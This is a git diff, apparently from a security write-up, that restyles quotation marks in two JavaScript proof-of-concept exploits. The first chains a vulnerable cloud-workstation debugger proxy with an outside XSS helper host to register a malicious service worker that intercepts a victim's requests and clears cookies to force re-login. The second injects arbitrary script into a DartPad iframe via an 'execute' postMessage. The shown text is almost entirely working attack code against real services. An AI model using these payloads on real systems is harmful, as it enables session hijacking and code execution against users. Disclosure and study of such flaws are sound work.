@@ -13,11 +13,11 @@ Its based of the Chii open source project: <https://github.com/liriliri/chii/com
 
 ```js
 // Vulnerable debugger proxy (Runs any js code you want, Fetch as the victims server)
-let target = "https://8282-monospace-<ID>.cloudworkstations.dev/proxy?url=";
+let target = 'https://8282-monospace-<ID>.cloudworkstations.dev/proxy?url=';
 
 // Link to our service worker
-let proxy = new URL("https://terjanq.me/xss.php");
-proxy.searchParams.set("ct", "application/javascript");
+let proxy = new URL('https://terjanq.me/xss.php');
+proxy.searchParams.set('ct', 'application/javascript');
 proxyPayload = `
 self.addEventListener("fetch", (event) => {
  let url = event.request.url;
@@ -30,23 +30,23 @@ self.addEventListener("fetch", (event) => {
  }
 });
 `;
-proxy.searchParams.set("html", proxyPayload);
+proxy.searchParams.set('html', proxyPayload);
 
 // Link to force a re-authenticate
-let reauth = new URL("https://terjanq.me/xss.php");
-reauth.searchParams.set("h[Clear-Site-Data]", '"cookies"');
+let reauth = new URL('https://terjanq.me/xss.php');
+reauth.searchParams.set('h[Clear-Site-Data]', '"cookies"');
 reauthPayload = `
 setTimeout(() => { location.href=location.origin }, 3000);
 `;
-reauth.searchParams.set("js", reauthPayload);
+reauth.searchParams.set('js', reauthPayload);
 
 // Link to create service worker
-let setup = new URL("https://terjanq.me/xss.php");
+let setup = new URL('https://terjanq.me/xss.php');
 setupPayload = `
 navigator.serviceWorker.register("${target + encodeURIComponent(proxy.href)}");
 setTimeout(() => { location.href="${target + encodeURIComponent(reauth.href)}" }, 3000);
 `;
-setup.searchParams.set("js", setupPayload);
+setup.searchParams.set('js', setupPayload);
 
 // Do the stuff
 location = target + encodeURIComponent(setup.href);
@@ -67,8 +67,8 @@ that use the code embed via a popup window reference which is a spoofing risk es
 ```js
 // Please click, Opening a victim popup needs user activation
 onclick = () => {
-  let frame = document.createElement("iframe");
-  frame.src = "https://dartpad.dev/frame.html";
+  let frame = document.createElement('iframe');
+  frame.src = 'https://dartpad.dev/frame.html';
   document.body.appendChild(frame);
 
   payload = `
@@ -83,10 +83,10 @@ onclick = () => {
   frame.onload = () => {
     frame.contentWindow.postMessage(
       {
-        command: "execute",
+        command: 'execute',
         js: payload,
       },
-      "*",
+      '*',
     );
   };
 };
